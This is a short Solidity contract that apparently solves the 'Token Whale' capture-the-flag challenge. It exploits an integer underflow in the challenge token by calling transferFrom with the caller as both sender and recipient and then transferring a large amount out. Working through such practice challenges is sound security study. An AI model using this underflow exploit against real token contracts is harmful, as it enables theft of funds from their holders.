pragma solidity ^0.4.21;

import "./TokenWhaleChallenge.sol";

contract TokenWhaleSolver {
    TokenWhaleChallenge public challenge;

    function TokenWhaleSolver(address _challenge) public payable {
        challenge = TokenWhaleChallenge(_challenge);
    }

    function solve() public {
      challenge.transferFrom(msg.sender, msg.sender, 1000);
      challenge.transfer(msg.sender, 32 ether - 2000);
    }

}
